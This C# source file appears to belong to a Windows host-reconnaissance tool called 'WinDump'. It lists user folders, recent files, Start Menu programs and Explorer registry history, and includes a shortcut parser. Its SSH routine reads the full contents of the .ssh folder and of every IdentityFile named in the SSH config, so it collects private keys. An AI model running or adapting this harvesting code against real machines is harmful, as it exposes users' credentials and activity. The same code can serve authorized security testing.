using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Data;
using System.IO;
using System.Reflection;
using System.Text;
using System.Text.RegularExpressions;

namespace WinDump
{
    class Directories
    {
        internal static DataTable Desktop()
        {
            return DirDump(@"%USERPROFILE%\Desktop");
        }
        internal static DataTable Documents()
        {
            return DirDump(@"%USERPROFILE%\Documents");
        }
        internal static DataTable SSH()
        {
            var path = Environment.ExpandEnvironmentVariables(@"%USERPROFILE%\.ssh");
            var dt = DirDump(path, true);
            var existFile = new Dictionary<string, bool>();
            var configContent = "";
            foreach (DataRow row in dt.Rows) {
                var name = row["Name"].ToString();
                if (name != "config")
                {
                    existFile[Path.Combine(path, name)] = true;
                }
                else
                {
                    configContent = row["Content"].ToString();
                }
            }
            if (configContent != "")
            {
                foreach(Match m in  new Regex(@"IdentityFile\s+(.*?)\n", RegexOptions.Compiled).Matches(configContent))
                {
                    var keypath = m.Groups[1].Value.Trim().Replace("~", "%USERPROFILE%").Replace("/", "\\");
                    keypath = Environment.ExpandEnvironmentVariables(keypath);
                    if (existFile.ContainsKey(keypath)) { 
                        continue;
                    }
                    if (!File.Exists(keypath))
                    {
                        continue;
                    }
                    var fileinfo = new FileInfo(keypath);
                    
                    dt.Rows.Add(fileinfo.LastWriteTime,fileinfo.Length,"",fileinfo.FullName,File.ReadAllText(keypath));
                }
            }

            return dt;
        }
        internal static DataTable Recent()
        {
            return DirDump(@"%APPDATA%\Microsoft\Windows\Recent");
        }
        internal static DataTable ExplorerHistory()
        {
            var dt = new DataTable();
            dt.Columns.Add("Name");
            dt.Columns.Add("Value");

            using(var key = Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU", false))
            {
                foreach(var name in key.GetValueNames())
                {
                    var value = key.GetValue(name);
                    dt.Rows.Add(name,value);
                }
            }
            using (var key = Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Explorer\TypedPaths", false))
            {
                foreach (var name in key.GetValueNames())
                {
                    var value = key.GetValue(name);
                    dt.Rows.Add(name, value);
                }
            }
            return dt;
        }
        internal static DataTable Programs()
        {
            var dt = DirDump(@"%ProgramData%\Microsoft\Windows\Start Menu\Programs");
            var dt2 = DirDump(@"%APPDATA%\Microsoft\Windows\Start Menu\Programs");
            dt.Merge(dt2);
            return dt;
        }
        internal static DataTable DirDump(string path,bool withContent=false,string searchParrten="*",SearchOption searchOption = SearchOption.TopDirectoryOnly)
        {
            DataTable dt = new DataTable();
            dt.Columns.Add("Date");
            dt.Columns.Add("Size");
            dt.Columns.Add("Link");
            dt.Columns.Add("Name");
            if (withContent)
            {
                dt.Columns.Add("Content");
            }

            path = Environment.ExpandEnvironmentVariables(path);
            if (!Directory.Exists(path))
            {
                return dt;
            }
            DirectoryInfo directoryInfo = new DirectoryInfo(path);

            foreach (var fileInfo in directoryInfo.GetFiles(searchParrten, searchOption))
            {
                var target = "";
                if (fileInfo.Extension == ".lnk")
                {
                    try
                    {
                        var shortcut = new WinShortcut(fileInfo.FullName);
                        target = shortcut.TargetPath;
                    }
                    catch { }
                }
                if (withContent)
                {
                    var content = "";
                    if (withContent)
                    {

                        content = Files.DumpFile(fileInfo.FullName, out var _);
                    }
                    dt.Rows.Add(fileInfo.LastWriteTime, fileInfo.Length, target, fileInfo.Name, content);
                }
                else
                {
                    dt.Rows.Add(fileInfo.LastWriteTime, fileInfo.Length, target, fileInfo.Name);
                }


            }
            if (!withContent)
            {
                foreach (var subDir in directoryInfo.GetDirectories())
                {
                    if (withContent)
                    {
                        dt.Rows.Add(subDir.LastWriteTime, "DIR", "", subDir.Name, "");
                    }
                    else
                    {
                        dt.Rows.Add(subDir.LastWriteTime, "DIR", "", subDir.Name);
                    }
                }
            }
            return dt;
        }

    }
    class WinShortcut
    {
        public class LinkFlags
        {
            public const int HasLinkTargetIdList = 0x00000001;
            public const int HasLinkInfo = 0x00000002;
            public const int HasName = 0x00000004;
            public const int HasRelativePath = 0x00000008;
            public const int HasWorkingDir = 0x00000010;
            public const int HasArguments = 0x00000020;
            public const int HasIconLocation = 0x00000040;
            public const int IsUnicode = 0x00000080;
            public const int ForceNoLinkInfo = 0x00000100;
            public const int HasExpIcon = 0x00004000;
            public const int EnableTargetMetadata = 0x00080000;
        }

        public class FileAttributes
        {
            public const int ReadOnly = 0x0001;
            public const int Hidden = 0x0002;
            public const int System = 0x0004;
            public const int Reserved1 = 0x0008;
            public const int Directory = 0x0010;
            public const int Archive = 0x0020;
            public const int Reserved2 = 0x0040;
            public const int Normal = 0x0080;
            public const int Temporary = 0x0100;
            public const int SparseFile = 0x0200;
            public const int ReparsePoint = 0x0400;
            public const int Compressed = 0x0800;
            public const int Offline = 0x1000;
            public const int NotContentIndexed = 0x2000;
            public const int Encrypted = 0x4000;
        }
        public class LinkInfoFlags
        {
            public const int VolumeIDAndLocalBasePath = 1;
            public const int CommonNetworkRelativeLinkAndPathSuffix = 2;
        }

        public WinShortcut(string path)
        {
            using (var istream = File.OpenRead(path))
            {
                try
                {
                    this.Parse(istream);
                }
                catch (Exception ex)
                {
                    throw new Exception("Failed to parse this file as a Windows shortcut", ex);
                }
            }
        }

        /// <summary>
        /// The real path of target this shortcut refers to.
        /// </summary>
        public string TargetPath { get; private set; }

        /// <summary>
        /// Whether the target this shortcut refers to is a directory.
        /// </summary>
        public bool IsDirectory { get; private set; }

        private void Parse(Stream istream)
        {
            var linkFlags = this.ParseHeader(istream);
            if ((linkFlags & LinkFlags.HasLinkTargetIdList) == LinkFlags.HasLinkTargetIdList)
            {
                this.ParseTargetIDList(istream);
            }
            if ((linkFlags & LinkFlags.HasLinkInfo) == LinkFlags.HasLinkInfo)
            {
                this.ParseLinkInfo(istream);
            }
        }

        /// <summary>
        /// Parse the header.
        /// </summary>
        /// <param name="stream"></param>
        /// <returns>The flags that specify the presence of optional structures</returns>
        private int ParseHeader(Stream stream)
        {
            stream.Seek(20, SeekOrigin.Begin);//jump to the LinkFlags part of ShellLinkHeader
            var buffer = new byte[4];
            stream.Read(buffer, 0, buffer.Length);
            var linkFlags = BitConverter.ToInt32(buffer, 0);

            stream.Read(buffer, 0, buffer.Length);//read next 4 bytes, that is FileAttributes
            var fileAttrFlags = BitConverter.ToInt32(buffer, 0);
            IsDirectory = (fileAttrFlags & FileAttributes.Directory) == FileAttributes.Directory;

            stream.Seek(36, SeekOrigin.Current);//jump to the HotKey part
            stream.Read(buffer, 0, 2);

            return linkFlags;
        }

        /// <summary>
        /// Parse the TargetIDList part.
        /// </summary>
        /// <param name="stream"></param>
        private void ParseTargetIDList(Stream stream)
        {
            stream.Seek(76, SeekOrigin.Begin);//jump to the LinkTargetIDList part
            var buffer = new byte[2];
            stream.Read(buffer, 0, buffer.Length);
            var size = BitConverter.ToInt16(buffer, 0);
            //the TargetIDList part isn't used currently, so just move the cursor forward
            stream.Seek(size, SeekOrigin.Current);
        }

        /// <summary>
        /// Parse the LinkInfo part.
        /// </summary>
        /// <param name="stream"></param>
        private void ParseLinkInfo(Stream stream)
        {
            var start = stream.Position;//save the start position of LinkInfo
            stream.Seek(8, SeekOrigin.Current);//jump to the LinkInfoFlags part
            var buffer = new byte[4];
            stream.Read(buffer, 0, buffer.Length);
            var lnkInfoFlags = BitConverter.ToInt32(buffer, 0);
            if ((lnkInfoFlags & LinkInfoFlags.VolumeIDAndLocalBasePath) == LinkInfoFlags.VolumeIDAndLocalBasePath)
            {
                stream.Seek(4, SeekOrigin.Current);
                stream.Read(buffer, 0, buffer.Length);
                var localBasePathOffset = BitConverter.ToInt32(buffer, 0);
                var basePathOffset = start + localBasePathOffset;
                stream.Seek(basePathOffset, SeekOrigin.Begin);

                using (var ms = new MemoryStream())
                {
                    var b = 0;
                    //get raw bytes of LocalBasePath
                    while ((b = stream.ReadByte()) > 0)
                        ms.WriteByte((byte)b);

                    TargetPath = Encoding.Default.GetString(ms.ToArray());
                }
            }
        }
    }

}
